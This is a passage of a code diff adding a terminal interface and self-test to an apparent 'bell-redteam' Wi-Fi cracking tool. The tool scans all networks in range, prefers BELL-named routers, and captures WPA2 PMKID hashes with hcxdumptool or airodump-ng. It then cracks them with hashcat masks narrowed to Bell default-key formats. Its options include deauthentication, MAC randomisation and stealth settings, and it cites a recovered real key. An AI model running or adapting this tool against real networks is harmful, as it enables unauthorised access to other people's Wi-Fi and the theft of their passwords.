+                if "MISSING" in line or "WARNING" in line:
+                    attr = curses.color_pair(4)
+                elif line.strip().startswith("["):
+                    attr = curses.color_pair(3)
+                self._put(stdscr, row + i, 2, line, attr)
+            self._footer(stdscr, "[Enter] continue    [q] quit")
+            stdscr.refresh()
+            key = stdscr.getch()
+            if key in (ord("q"), ord("Q")):
+                return "quit"
+            if key in (10, 13, curses.KEY_ENTER):
+                self.state.preflight = Workflow(self.state).preflight()
+                return "interfaces"
+
+    # -- screen: interfaces ----------------------------------------------
+    def _screen_interfaces(self, stdscr) -> str:
+        self.interfaces = list_interfaces()
+        preferred = preferred_interface(self.interfaces)
+        self.idx = self.interfaces.index(preferred) if preferred else 0
+        while True:
+            stdscr.erase()
+            row = self._header(stdscr, "Select the wireless adapter")
+            if not self.interfaces:
+                self._put(stdscr, row, 2, "No wireless interfaces found.",
+                          curses.color_pair(4))
+            else:
+                self._put(stdscr, row, 2,
+                          "  #  interface   kind       form      mac                "
+                          "driver       phy    ch  monitor",
+                          curses.color_pair(1) | curses.A_BOLD)
+                for i, iface in enumerate(self.interfaces):
+                    selected = i == self.idx
+                    attr = curses.color_pair(2) | curses.A_BOLD if selected else 0
+                    marker = ">" if selected else " "
+                    form = "virtual" if iface.virtual else "physical"
+                    drv = adapter_driver(iface.name) or "-"
+                    line = (
+                        f" {marker} {i:>2}  {iface.name:<12} {iface.kind:<10} "
+                        f"{form:<9} {iface.mac:<18} {drv:<12} {iface.phy:<6} "
+                        f"{str(iface.channel or '-'):<4} "
+                        f"{'yes' if monitor_capable(iface) else 'no'}"
+                    )
+                    self._put(stdscr, row + 2 + i, 2, line, attr)
+            note = row + 2 + len(self.interfaces) + 2
+            self._put(stdscr, note, 2,
+                      "Ralink USB adapters (rt2800usb) are listed first and "
+                      "selected by default.", curses.color_pair(3))
+            self._put(stdscr, note + 1, 2,
+                      "hcxdumptool guidance: avoid virtual monitor interfaces "
+                      "(wlanmon0/mon1) and let it set",
+                      curses.color_pair(6))
+            self._put(stdscr, note + 2, 2,
+                      "monitor mode itself. The 'physical' strategy below does "
+                      "exactly that.", curses.color_pair(6))
+            self._footer(stdscr, "[Up/Down] select   [Enter] choose   "
+                                "[r] rescan   [q] quit")
+            stdscr.refresh()
+            key = stdscr.getch()
+            if key in (ord("q"), ord("Q")):
+                return "quit"
+            if key in (ord("r"), ord("R")):
+                self.interfaces = list_interfaces()
+                preferred = preferred_interface(self.interfaces)
+                self.idx = self.interfaces.index(preferred) if preferred else 0
+                continue
+            if key in (curses.KEY_DOWN, ord("j")):
+                self.idx = min(self.idx + 1, max(0, len(self.interfaces) - 1))
+            elif key in (curses.KEY_UP, ord("k")):
+                self.idx = max(0, self.idx - 1)
+            elif key in (10, 13, curses.KEY_ENTER):
+                if not self.interfaces:
+                    continue
+                chosen = self.interfaces[self.idx]
+                self.cfg.set("interface", chosen.name)
+                self.status = f"interface {chosen.name} selected"
+                return "config"
+
+    # -- screen: config --------------------------------------------------
+    SETTINGS = [
+        ("interface", "Wireless adapter", "text"),
+        ("capture_backend", "Capture backend", "choice"),
+        ("monitor_mode", "Monitor mode strategy", "choice"),
+        ("scan_seconds", "Scan duration (seconds)", "int"),
+        ("randomize_mac", "Randomize adapter MAC", "bool"),
+        ("allow_deauth", "Allow deauthentication", "bool"),
+        ("stop_networkmanager", "Stop NetworkManager", "bool"),
+        ("build_bpf", "Scope capture with BPF filter", "bool"),
+        ("scope_preset", "Scope", "choice"),
+        ("essid_regex", "Custom scope regex", "text"),
+        ("ssid_prefix", "Literal SSID prefix", "text"),
+        ("mask_len", "Masked characters", "int"),
+        ("keyspace_charsets", "Keyspace charsets", "text"),
+        ("mask_charsets", "Alphanumeric fallback", "text"),
+        ("policy_masks", "Use the class policy masks", "bool"),
+        ("include_prefixed", "Try prefixed masks", "bool"),
+        ("include_evidence_masks", "Try ESSID-derived masks", "bool"),
+        ("mask_order", "Mask ordering", "choice"),
+        ("rule_file", "Rule file for candidates", "text"),
+        ("hashcat_cores", "hashcat cores", "int"),
+        ("hashcat_device_ids", "hashcat GPU ids", "text"),
+        ("max_hours_per_step", "Hours per step", "float"),
+        ("allow_huge_keyspace", "Allow huge keyspaces", "bool"),
+        ("wordlist", "Wordlist path", "text"),
+    ]
+
+    RATIONALE = {
+        "scope_preset": "all = every signal in range, bell7 = only the BELL7 "
+                        "networks, bell = any BELL network",
+        "preferred_regex": "these networks are attacked first and are "
+                            "pre-selected in the target list",
+        "randomize_mac": "hcxdumptool uses its own random MAC space, so this "
+                         "mainly affects the deauth path",
+        "allow_deauth": "PMKID needs no deauth; deauth is detectable and "
+                        "disruptive",
+        "build_bpf": "hcxdumptool requires BPF together with a filter list",
+        "monitor_mode": "physical avoids the virtual wlanmonX interfaces",
+        "scan_seconds": "how long airodump-ng listens per scan; 60s gives "
+                        "more time to see distant access points",
+        "mask_len": "the Bell WPA2 key is 8 characters, and hashcat's WPA "
+                    "kernels refuse anything shorter",
+        "mask_order": "bell-first = Aa0-9 8-char mask first (as requested); "
+                      "effective = cheapest first; requested = insertion order",
+        "keyspace_charsets": "the documented Bell keyspace is upper case hex "
+                             "(16^8), which is 50,800 times smaller than 62^8",
+        "policy_masks": "8 characters with at least one lower case letter, "
+                        "one upper case letter and one digit; removes the "
+                        "anti-candidates by construction",
+        "include_prefixed": "also try masks that start with the SSID prefix",
+        "include_evidence_masks": "also try the ESSID-derived narrow masks",
+        "hashcat_device_ids": "hashcat -d, e.g. 1,2 to pick two GPUs",
+        "allow_huge_keyspace": "the full 62^8 mask needs thousands of years on "
+                               "CPU",
+        "max_hours_per_step": "0 (or blank) means unlimited - run until the "
+                              "keyspace is exhausted or you press q",
+    }
+
+    def _screen_config(self, stdscr) -> str:
+        row_idx = 0
+        while True:
+            stdscr.erase()
+            row = self._header(stdscr, "Stealth and attack settings")
+            self._put(stdscr, row, 2, "  Settings (Enter edits, d restores the "
+                                      "default)", curses.color_pair(1) | curses.A_BOLD)
+            for i, (key, label, kind) in enumerate(self.SETTINGS):
+                value = self.cfg.get(key)
+                if kind == "bool":
+                    shown = "yes" if value else "no"
+                elif kind == "choice":
+                    shown = str(value)
+                else:
+                    shown = str(value)
+                selected = i == row_idx
+                attr = curses.color_pair(2) | curses.A_BOLD if selected else 0
+                self._put(stdscr, row + 2 + i, 2,
+                          f" {'>' if selected else ' '} {label:<30} {shown}",
+                          attr)
+            why = row + 2 + len(self.SETTINGS) + 1
+            key, label, _ = self.SETTINGS[row_idx]
+            if key in self.RATIONALE:
+                self._put(stdscr, why, 2, "  " + self.RATIONALE[key],
+                          curses.color_pair(6))
+            if self.status:
+                self._put(stdscr, why + 1, 2, "  " + self.status,
+                          curses.color_pair(3))
+            self._footer(stdscr, "[Up/Down] move   [Enter] edit   [d] default   "
+                                "[s] save   [n] next   [q] quit")
+            stdscr.refresh()
+            key = stdscr.getch()
+            if key in (ord("q"), ord("Q")):
+                return "quit"
+            if key in (curses.KEY_DOWN, ord("j")):
+                row_idx = (row_idx + 1) % len(self.SETTINGS)
+            elif key in (curses.KEY_UP, ord("k")):
+                row_idx = (row_idx - 1) % len(self.SETTINGS)
+            elif key in (ord("d"), ord("D")):
+                skey, _, _ = self.SETTINGS[row_idx]
+                self.cfg.set(skey, DEFAULTS[skey])
+            elif key in (ord("s"), ord("S")):
+                self.cfg.save(self.workdir_config())
+                self.status = "settings saved"
+            elif key in (ord("n"), ord("N")):
+                self.cfg.save(self.workdir_config())
+                return "targets"
+            elif key in (10, 13, curses.KEY_ENTER):
+                self._edit(stdscr, self.SETTINGS[row_idx])
+                self.status = ""
+
+    def workdir_config(self) -> Path:
+        return self.state.workdir / "config.json"
+
+    def _edit(self, stdscr, setting) -> None:
+        key, label, kind = setting
+        h, w = stdscr.getmaxyx()
+        if h < 5 or w < 20:
+            return
+        if kind == "bool":
+            self.cfg.set(key, not bool(self.cfg.get(key)))
+            return
+        if kind == "choice":
+            options = CHOICES.get(key, [])
+            if not options:
+                return
+            current = str(self.cfg.get(key))
+            idx = options.index(current) if current in options else 0
+            self.cfg.set(key, options[(idx + 1) % len(options)])
+            return
+        h, w = stdscr.getmaxyx()
+        prompt = f"  {label}: "
+        self._put(stdscr, h - 3, 2, prompt)
+        try:
+            curses.echo()
+            curses.curs_set(1)
+            field = stdscr.getstr(h - 3, 2 + len(prompt), 60)
+            curses.curs_set(0)
+            curses.noecho()
+        except curses.error:
+            field = b""
+        finally:
+            curses.noecho()
+        value = field.decode("utf-8", errors="replace").strip() if field else ""
+        if not value:
+            return
+        if kind == "int":
+            self.cfg.set(key, safe_int(value, int(self.cfg.get(key) or 0)))
+        elif kind == "float":
+            self.cfg.set(key, safe_float(value, float(self.cfg.get(key) or 0.0)))
+        else:
+            self.cfg.set(key, value)
+
+    # -- screen: targets -------------------------------------------------
+    def _screen_targets(self, stdscr) -> str:
+        workflow = Workflow(self.state)
+        if not self.state.targets:
+            # the scan runs in the background so the interface stays alive
+            self.state.message = "scanning for access points"
+            save_terminal_state()
+            scan_error: Dict[str, Exception] = {}
+            def _run_scan() -> None:
+                try:
+                    workflow.do_scan()
+                except Exception as exc:  # noqa: BLE001 - surface in TUI
+                    scan_error["exc"] = exc
+            scanner = threading.Thread(target=_run_scan, daemon=True)
+            scanner.start()
+            while scanner.is_alive():
+                stdscr.timeout(200)
+                stdscr.erase()
+                row = self._header(stdscr, "Select BELL targets")
+                self._put(stdscr, row + 1, 2,
+                          "  scanning for access points, please wait ...",
+                          curses.color_pair(2))
+                self._footer(stdscr, "[q] quit")
+                stdscr.refresh()
+                if stdscr.getch() in (ord("q"), ord("Q")):
+                    return "quit"
+            scanner.join()
+            restore_terminal_state(stdscr)
+            if "exc" in scan_error:
+                self.state.message = f"scan failed: {scan_error['exc']}"
+                self.log(f"scan failed: {scan_error['exc']}", "error")
+                return "config"
+
+        for target in self.state.targets:
+            target.selected = True
+        idx = 0
+        try:
+            curses.flushinp()
+        except Exception:
+            pass
+        stdscr.timeout(-1)
+        stdscr.nodelay(False)
+        try:
+            curses.noecho()
+            curses.cbreak()
+        except Exception:
+            pass
+        while True:
+            stdscr.erase()
+            row = self._header(stdscr, "Select BELL targets")
+            targets = self.state.targets
+            preferred = [t for t in targets
+                         if is_preferred(t.essid, self.cfg)]
+            if not targets:
+                self._put(stdscr, row, 2, "No access points were found.",
+                          curses.color_pair(4))
+            else:
+                self._put(stdscr, row, 2,
+                          "  *  preferred (BELL7 by default), selected by default",
+                          curses.color_pair(6))
+                self._put(stdscr, row + 1, 2,
+                          "     #  ESSID                    BSSID               "
+                          "ch   signal  enc      selected",
+                          curses.color_pair(1) | curses.A_BOLD)
+                for i, target in enumerate(targets):
+                    selected = i == idx
+                    attr = curses.color_pair(2) | curses.A_BOLD if selected else 0
+                    mark = "[x]" if target.selected else "[ ]"
+                    star = "*" if is_preferred(target.essid, self.cfg) else " "
+                    self._put(
+                        stdscr, row + 3 + i, 2,
+                        f" {'>' if selected else ' '} {star} {i:>2}  "
+                        f"{target.essid:<23} {target.bssid:<18} "
+                        f"{str(target.channel or '-'):<4} {target.signal:<7} "
+                        f"{target.encr:<8} {mark}",
+                        attr,
+                    )
+            self._footer(stdscr, "[Up/Down] move   [Space] toggle   [a] all   "
+                                "[p] preferred only   [n] none   [s] rescan   "
+                                "[Enter] continue   [q] quit")
+            stdscr.refresh()
+            key = stdscr.getch()
+            if key in (ord("q"), ord("Q")):
+                return "quit"
+            if key in (curses.KEY_DOWN, ord("j")):
+                idx = min(idx + 1, max(0, len(targets) - 1))
+            elif key in (curses.KEY_UP, ord("k")):
+                idx = max(0, idx - 1)
+            elif key == ord(" "):
+                if targets:
+                    targets[idx].selected = not targets[idx].selected
+            elif key in (ord("a"), ord("A")):
+                for target in targets:
+                    target.selected = True
+            elif key in (ord("p"), ord("P")):
+                for target in targets:
+                    target.selected = is_preferred(target.essid, self.cfg)
+            elif key in (ord("n"), ord("N")):
+                for target in targets:
+                    target.selected = False
+            elif key in (ord("s"), ord("S")):
+                self.state.targets = []
+                scanner = threading.Thread(target=workflow.do_scan, daemon=True)
+                scanner.start()
+                while scanner.is_alive():
+                    stdscr.timeout(200)
+                    stdscr.refresh()
+                    stdscr.getch()
+                scanner.join()
+                idx = 0
+            elif key in (10, 13, curses.KEY_ENTER):
+                self.cfg.save(self.workdir_config())
+                return "run"
+
+    # -- screen: run -----------------------------------------------------
+    def _screen_run(self, stdscr) -> str:
+        workflow = Workflow(self.state)
+        self.workflow = workflow
+        phases = ["preflight", "capture", "filter", "plan", "attack", "report"]
+        if not self.state.targets:
+            phases.insert(1, "scan")
+        self.thread = threading.Thread(
+            target=workflow.run, args=(phases,), daemon=True
+        )
+        save_terminal_state()
+        self.thread.start()
+        restored = False
+
+        while True:
+            stdscr.erase()
+            row = self._header(stdscr, "Attack phases")
+            state = self.state
+            self._put(
+                stdscr, row, 2,
+                f"  Phase {state.phase_index}/{state.phase_total}: {state.phase}"
+                f"   {state.message}",
+                curses.color_pair(2) | curses.A_BOLD,
+            )
+            if state.error:
+                self._put(stdscr, row + 1, 2, "  ERROR: " + state.error,
+                          curses.color_pair(4))
+
+            step_row = row + 3
+            self._put(stdscr, step_row, 2, "  Step checklist", curses.color_pair(1)
+                      | curses.A_BOLD)
+            for i, step in enumerate(state.plan):
+                status = state.step_state.get(step.name, "pending")
+                attr = 0
+                mark = "."
+                if status == "running":
+                    mark, attr = ">", curses.color_pair(2) | curses.A_BOLD
+                elif status == "done":
+                    mark, attr = "+", curses.color_pair(3)
+                elif status == "skipped":
+                    mark, attr = "-", curses.color_pair(6)
+                elif status == "error":
+                    mark, attr = "x", curses.color_pair(4)
+                eta = human_time(step.est_seconds) if step.est_seconds else "-"
+                self._put(
+                    stdscr, step_row + 2 + i, 2,
+                    f"  {mark} {step.name:<28} {human_count(step.keyspace):>10} "
+                    f"keyspace  eta {eta:<8} {status}",
+                    attr,
+                )
+                detail = state.step_detail.get(step.name, "")
+                if detail:
+                    self._put(stdscr, step_row + 3 + i, 6, detail[:100],
+                              curses.color_pair(6))
+
+            log_row = step_row + 3 + max(1, len(state.plan)) + 2
+            self._put(stdscr, log_row, 2, "  Output", curses.color_pair(1) | curses.A_BOLD)
+            for i, line in enumerate(state.current_log[-8:]):
+                self._put(stdscr, log_row + 2 + i, 2, line[:140])
+
+            if state.done:
+                if not restored:
+                    restore_terminal_state(stdscr)
+                    restored = True
+                self._footer(stdscr, "[Enter] results   [q] quit")
+            else:
+                self._footer(stdscr, "[q] stop   (phases run automatically)")
+            stdscr.refresh()
+
+            if state.done:
+                stdscr.timeout(-1)
+            else:
+                stdscr.timeout(500)
+            key = stdscr.getch()
+            if key in (ord("q"), ord("Q")):
+                state.stop_requested = True
+                if stop_running_step():
+                    state.message = "the running step was stopped"
+                if self.thread:
+                    self.thread.join(timeout=20)
+                stdscr.timeout(-1)
+                return "results"
+            if state.done and key in (10, 13, curses.KEY_ENTER):
+                if self.thread:
+                    self.thread.join(timeout=5)
+                stdscr.timeout(-1)
+                return "results"
+
+    # -- screen: results -------------------------------------------------
+    def _screen_results(self, stdscr) -> str:
+        payload = self.state.payload
+        while True:
+            stdscr.erase()
+            row = self._header(stdscr, "Results")
+            if not payload:
+                self._put(stdscr, row, 2, "  No report generated yet.",
+                          curses.color_pair(6))
+            else:
+                self._put(stdscr, row, 2,
+                          f"  hashes {payload.get('hashes', 0)}   "
+                          f"cracked {payload.get('cracked_count', 0)}   "
+                          f"essids {', '.join(payload.get('essids', [])) or '-'}",
+                          curses.color_pair(2) | curses.A_BOLD)
+                self._put(stdscr, row + 2, 2, "  ESSID                    BSSID"
+                          "               KEY", curses.color_pair(1) | curses.A_BOLD)
+                for i, item in enumerate(payload.get("results", [])):
+                    attr = curses.color_pair(3) if item.get("cracked") else 0
+                    self._put(stdscr, row + 4 + i, 2,
+                              f"  {item.get('essid', ''):<23} "
+                              f"{item.get('bssid', ''):<18} "
+                              f"{item.get('key', '')}", attr)
+                if self.state.error:
+                    self._put(stdscr, row + 6 + len(payload.get("results", [])),
+                              2, "  error: " + self.state.error,
+                              curses.color_pair(4))
+            self._footer(stdscr, "[w] write report   [q] quit")
+            stdscr.refresh()
+            key = stdscr.getch()
+            if key in (ord("q"), ord("Q")):
+                return "quit"
+            if key in (ord("w"), ord("W")):
+                Workflow(self.state).do_report()
+                payload = self.state.payload
+
+    # -- plain fallback --------------------------------------------------
+    def _plain(self) -> int:
+        print(f"{APP} {VERSION} - plain mode")
+        workflow = Workflow(self.state)
+        info = workflow.preflight()
+        missing = info.get("missing", [])
+        if missing:
+            print(f"missing tools: {', '.join(missing)}")
+        ifaces = info.get("interfaces", [])
+        if not ifaces:
+            print("no wireless interfaces found")
+            return 0
+        print("\navailable adapters:")
+        preferred = preferred_interface(list_interfaces())
+        for i, iface in enumerate(ifaces):
+            drv = adapter_driver(iface['name']) or '-'
+            mark = " (preferred)" if preferred and iface['name'] == preferred.name else ""
+            print(f"  [{i}] {iface['name']:<14} {iface['kind']:<10} "
+                  f"{'virtual' if iface['virtual'] else 'physical':<9} "
+                  f"{iface['mac']:<18} {drv}{mark}")
+        try:
+            choice = input("\nadapter number (blank to quit): ").strip()
+        except (EOFError, KeyboardInterrupt):
+            return 0
+        if not choice:
+            return 0
+        if choice.isdigit():
+            idx = int(choice)
+            if 0 <= idx < len(ifaces):
+                choice = ifaces[idx]["name"]
+            else:
+                print(f"invalid selection {idx}")
+                return 0
+        self.cfg.set("interface", choice)
+        self.cfg.save(self.workdir_config())
+        print(f"using {choice}")
+
+        try:
+            seconds = max(60, int(self.cfg.get("scan_seconds") or DEFAULTS["scan_seconds"]))
+            input(f"\npress Enter to scan for access points ({seconds}s)...")
+        except (EOFError, KeyboardInterrupt):
+            return 0
+        workflow.do_scan()
+        targets = self.state.targets
+        if not targets:
+            print("no matching access points found")
+            return 0
+        print(f"\n{len(targets)} access point(s) in scope:")
+        for i, t in enumerate(targets):
+            mark = "[x]" if t.selected else "[ ]"
+            pref = "*" if is_preferred(t.essid, self.cfg) else " "
+            print(f"  {pref} {i:>2}  {t.essid:<24} {t.bssid:<18} "
+                  f"ch{str(t.channel or '-'):<3} {t.signal:>4}  {mark}")
+        print("\ncommands: 'a'=all  'p'=preferred only  'n'=none  "
+              "'<num>'=toggle  'Enter'=continue  'q'=quit")
+        while True:
+            try:
+                cmd = input("> ").strip().lower()
+            except (EOFError, KeyboardInterrupt):
+                return 0
+            if cmd == "q":
+                return 0
+            if cmd == "a":
+                for t in targets:
+                    t.selected = True
+            elif cmd == "p":
+                for t in targets:
+                    t.selected = is_preferred(t.essid, self.cfg)
+            elif cmd == "n":
+                for t in targets:
+                    t.selected = False
+            elif cmd == "":
+                break
+            elif cmd.isdigit() and 0 <= int(cmd) < len(targets):
+                targets[int(cmd)].selected = not targets[int(cmd)].selected
+            else:
+                print("unknown command")
+                continue
+            for i, t in enumerate(targets):
+                mark = "[x]" if t.selected else "[ ]"
+                pref = "*" if is_preferred(t.essid, self.cfg) else " "
+                print(f"  {pref} {i:>2}  {t.essid:<24} {t.bssid:<18} "
+                      f"ch{str(t.channel or '-'):<3} {t.signal:>4}  {mark}")
+
+        print("\nrunning attack phases...")
+        phases = ["capture", "filter", "plan", "attack", "report"]
+        workflow.run(phases)
+        if self.state.error:
+            print(f"error: {self.state.error}")
+        if self.state.payload:
+            p = self.state.payload
+            print(f"\nhashes {p.get('hashes', 0)}  "
+                  f"cracked {p.get('cracked_count', 0)}")
+            for item in p.get("results", []):
+                if item.get("cracked"):
+                    print(f"  [OK] {item['essid']} {item['bssid']} {item['key']}")
+        return 0 if not self.state.error else 1
+
+
+# --------------------------------------------------------------------------
+# self test (offline, no network)
+# --------------------------------------------------------------------------
+
+
+def _synthetic_hash(essid: str, password: str) -> str:
+    """Build a valid hc22000 PMKID line for a known password.
+
+    The PMKID is 128 bit and is not a plain PBKDF2 truncation:
+
+        PMK   = PBKDF2-HMAC-SHA1(password, ESSID, 4096, 32)
+        PMKID = Truncate128(HMAC-SHA1(PMK, "PMK Name" || AA || SPA))
+
+    where AA is the access point MAC and SPA the station MAC. Verified
+    against hashcat's own published example hash for mode 22000.
+    """
+    import hashlib
+    import hmac
+
+    ap = "fc690c158264"
+    sta = "f4747f87f9f4"
+    pmk = hashlib.pbkdf2_hmac(
+        "sha1", password.encode("utf-8"), essid.encode("utf-8"), 4096, 32
+    )
+    context = b"PMK Name" + bytes.fromhex(ap) + bytes.fromhex(sta)
+    pmkid = hmac.new(pmk, context, hashlib.sha1).digest()[:16]
+    return (
+        f"WPA*01*{pmkid.hex()}*{ap}*{sta}*"
+        f"{essid.encode('utf-8').hex()}***"
+    )
+
+
+def selftest(run_hashcat_check: bool = True) -> int:
+    """Offline validation of the parser, the planner and the mask syntax."""
+    failures: List[str] = []
+
+    def check(name: str, condition: bool, detail: str = "") -> None:
+        if condition:
+            print(f"  ok   {name}")
+        else:
+            print(f"  FAIL {name} {detail}")
+            failures.append(name)
+
+    print("bell-redteam selftest")
+
+    # 1. hc22000 parsing
+    essid = "BELL726"
+    password = "BELLaaaaaaa"
+    line = _synthetic_hash(essid, password)
+    entry = parse_22000(line)
+    check("hc22000 line parses", entry is not None)
+    if entry:
+        check("ESSID recovered from field 5", entry.essid == essid,
+              f"got {entry.essid!r}")
+        check("AP MAC recovered", entry.bssid == "fc690c158264",
+              f"got {entry.bssid!r}")
+        check("PMKID recovered", entry.pmkid == line.split("*")[2])
+
+    # 1b. the hashcat reference hash must parse the same way
+    reference = ("WPA*01*4d4fe7aac3a2cecab195321ceb99a7d0*fc690c158264*"
+                 "f4747f87f9f4*686173686361742d6573736964***")
+    ref = parse_22000(reference)
+    check("hashcat's published example hash parses",
+          ref is not None and ref.essid == "hashcat-essid",
+          f"got {ref.essid if ref else None!r}")
+
+    # 1c. the airodump-ng CSV column map, verified against the upstream
+    #     writer in src/airodump-ng/dump_write.c
+    csv_path = Path("/tmp/kilo/bell-selftest-scan.csv")
+    csv_path.write_text(
+        "BSSID, First time seen, Last time seen, channel, Speed, Privacy, "
+        "Cipher, Authentication, Power, # beacons, # IV, LAN IP, ID-length, "
+        "ESSID, Key\r\n"
+        "Station MAC, First time seen, Last time seen, Power, # packets, "
+        "BSSID, Probed ESSIDs\r\n"
+        "AA:BB:CC:DD:EE:01, 2026-10-20 15:01:02, 2026-10-20 15:04:02,  6, "
+        " 54, WPA2, CCMP, PSK, -42,   12,   340, 0.0.0.0,   7, BELL726, \r\n"
+        "AA:BB:CC:DD:EE:02, 2026-10-20 15:01:02, 2026-10-20 15:04:02, 11, "
+        " 11, WPA2, TKIP, PSK, -70,    3,     0, 0.0.0.0,   8, BELL706, \r\n",
+        encoding="utf-8",
+    )
+    parsed = parse_airodump_csv(csv_path)
+    check("the airodump CSV yields one access point per row", len(parsed) == 2,
+          str(len(parsed)))
+    if len(parsed) == 2:
+        check("the ESSID comes from column 13",
+              parsed[0].essid == "BELL726", repr(parsed[0].essid))
+        check("the channel comes from column 3", parsed[0].channel == 6,
+              str(parsed[0].channel))
+        check("the signal comes from column 8", parsed[0].signal == -42,
+              str(parsed[0].signal))
+        check("the id length comes from column 12", parsed[0].length == 7,
+              str(parsed[0].length))
+        check("the encryption is read from the privacy and cipher columns",
+              "WPA2" in parsed[0].encr and "CCMP" in parsed[0].encr,
+              parsed[0].encr)
+        check("the second access point is parsed as well",
+              parsed[1].essid == "BELL706" and parsed[1].channel == 11,
+              f"{parsed[1].essid} {parsed[1].channel}")
+
+    # 2. charset expansion
+    check("charset Aa0-9 expands to 62 chars",          len(expand_charset("Aa0-9")) == 62,
+          f"got {len(expand_charset('Aa0-9'))}")
+    check("charset Aa0-9 content is correct",
+          expand_charset("Aa0-9") == ("ABCDEFGHIJKLMNOPQRSTUVWXYZ"
+                                      "abcdefghijklmnopqrstuvwxyz0123456789"))
+    check("charset 0-9 expands to 10 digits",
+          expand_charset("0-9") == "0123456789")
+    check("charset Aa09 expands to the same 62 characters",
+          expand_charset("Aa09") == expand_charset("Aa0-9"))
+
+    # 2b. the scope: everything in range, with the BELL7 networks preferred
+    scope_cfg = Config()
+    check("the default scope is everything in range",
+          scope_regex(scope_cfg) == ".*", scope_regex(scope_cfg))
+    scope_cfg.set("scope_preset", "bell7")
+    check("the bell7 preset selects the BELL7 networks",
+          scope_regex(scope_cfg) == "^BELL7..$", scope_regex(scope_cfg))
+    check("the bell7 preset accepts BELL777",
+          re.search(scope_regex(scope_cfg), "BELL777", re.IGNORECASE) is not None)
+    check("the bell7 preset rejects a bare BELL7",
+          re.search(scope_regex(scope_cfg), "BELL7", re.IGNORECASE) is None)
+    check("the bell7 preset rejects an unrelated network",
+          re.search(scope_regex(scope_cfg), "SomeOtherNet", re.IGNORECASE) is None)
+    scope_cfg.set("scope_preset", "bell")
+    check("the bell preset accepts any BELL network",
+          re.search(scope_regex(scope_cfg), "BELL777", re.IGNORECASE) is not None)
+    check("the bell preset rejects an unrelated network",
+          re.search(scope_regex(scope_cfg), "SomeOtherNet", re.IGNORECASE) is None)
+    check("the preferred set is the BELL7 networks",
+          is_preferred("BELL777", scope_cfg) and is_preferred("bell706", scope_cfg))
+    check("an unrelated network is not preferred",
+          not is_preferred("SomeOtherNet", scope_cfg))
+    check("the scope needs no typed configuration",
+          scope_cfg.get("scope_preset") in CHOICES["scope_preset"])
+
+    # 3. mask chain, built from real Bell SSIDs
+    bell_essids = ["BELL726", "BELL706", "bell123", "BELL998"]
+    entries = [
+        HashEntry(raw=line, mtype="01", essid=essid_name,
+                  bssid="fc690c158264", sta="f4747f87f9f4", pmkid="")
+        for essid_name in bell_essids
+    ]
+    cfg = Config()
+    cfg.set("ssid_prefix", "BELL")
+    cfg.set("mask_len", 8)
+    cfg.set("mask_order", "effective")
+    plan = build_plan(entries, cfg, Path("/tmp/bell.22000"), 3000.0)
+    check("plan is not empty", len(plan) > 0)
+    masks = [s.mask for s in plan]
+    check("8 character alphanumeric mask is in the chain",
+          "?1" * 8 in masks, str(masks))
+    check("the documented Bell hex keyspace is in the chain",
+          any(s.mask == "?1" * 8 and s.charsets == ["0123456789ABCDEF"]
+              for s in plan),
+          str([(s.mask, s.charsets) for s in plan]))
+    check("the 7 character and prefixed steps are gone by default",
+          not any(s.name.startswith("mask:position") for s in plan)
+          and not any("prefixed" in s.name for s in plan),
+          str([s.name for s in plan]))
+    check("effective order is ascending by keyspace",
+          all(
+              plan[i].keyspace <= plan[i + 1].keyspace
+              for i in range(len(plan) - 1)
+          ),
+          str([s.keyspace for s in plan]))
+    check("every mask step has at least one charset",
+          all(s.charsets for s in plan if s.kind == "mask" and not s.mask_file))
+    check("step names are unique", len({s.name for s in plan}) == len(plan),
+          str([s.name for s in plan]))
+
+    def candidate_length(mask: str) -> int:
+        """Each '?N' placeholder stands for one character."""
+        return len(mask) - mask.count("?")
+
+    check("every mask yields a passphrase of the configured length",
+          all(candidate_length(s.mask) in (8, len("BELL") + 8)
+              for s in plan if s.kind == "mask" and s.mask),
+          str([(s.mask, candidate_length(s.mask)) for s in plan]))
+    check("no mask candidate is shorter than the WPA minimum",
+          all(candidate_length(s.mask) >= PSK_MIN_LEN
+              for s in plan if s.kind == "mask" and s.mask))
+
+    # the evidence masks are opt-in and still produce a lowercase literal
+    cfg_evidence = Config()
+    cfg_evidence.set("ssid_prefix", "BELL")
+    cfg_evidence.set("mask_len", 8)
+    cfg_evidence.set("include_evidence_masks", True)
+    plan_e = build_plan(entries, cfg_evidence, Path("/tmp/bell.22000"), 3000.0)
+    check("the lowercase SSID produced its own literal",
+          any(s.mask.startswith("bell") for s in plan_e),
+          str([s.mask for s in plan_e]))
+    check("the position-hybrid variant is in the chain",
+          any("position-hybrid" in s.name for s in plan_e),
+          str([s.name for s in plan_e]))
+
+    # 4. derived candidates
+    long_entry = HashEntry(raw=line, mtype="01", essid="BELL7261",
+                            bssid="fc690c158264", sta="f4747f87f9f4", pmkid="")
+    derived = derived_candidates(entries + [long_entry], "BELL")
+    check("derived candidates include the ESSID", "BELL7261" in derived)
+    check("derived candidates include the lowercase variant", "bell7261" in derived,
+          str(derived))
+    check("derived candidates drop values under the WPA minimum",
+          all(len(c) >= PSK_MIN_LEN for c in derived))
+    check("a 7 character ESSID is not offered as a passphrase",
+          "BELL726" not in derived, str(derived))
+
+    # 5. the documented Bell keyspace
+    check("the Bell keyspace is upper case hexadecimal",
+          expand_charset("0-9A-F") == "0123456789ABCDEF")
+    check("the Bell keyspace has 16 characters",
+          len(expand_charset("0-9A-F")) == 16)
+    check("16^8 is 4,294,967,296", 16 ** 8 == 4294967296)
+    check("the real recovered Bell key is inside the documented keyspace",
+          all(c in "0123456789ABCDEF" for c in BELL_REAL_KEY_EXAMPLE),
+          BELL_REAL_KEY_EXAMPLE)
+    check("the real recovered Bell key is 8 characters",
+          len(BELL_REAL_KEY_EXAMPLE) == 8)
+    check("the documented keyspace is 50,000 times smaller than 62^8",
+          62 ** 8 // 16 ** 8 > 50000, str(62 ** 8 // 16 ** 8))
+    check("the reduced Bell keyspace has 13 characters",
+          len(REDUCED_BELL_KEYSPACE) == 13,
+          str(len(REDUCED_BELL_KEYSPACE)))
+    check("the reduced keyspace omits 0, 8 and B",
+          "0" not in REDUCED_BELL_KEYSPACE
+          and "8" not in REDUCED_BELL_KEYSPACE
+          and "B" not in REDUCED_BELL_KEYSPACE)
+    check("13^8 is 815,730,721", 13 ** 8 == 815730721, str(13 ** 8))
+    check("the reduced keyspace is smaller than the full Bell keyspace",
+          13 ** 8 < 16 ** 8)
+    check("the real recovered key A2F7F579 is inside the reduced keyspace",
+          all(c in REDUCED_BELL_KEYSPACE for c in "A2F7F579"), "A2F7F579")
+
+    # 6. anti-candidate rules
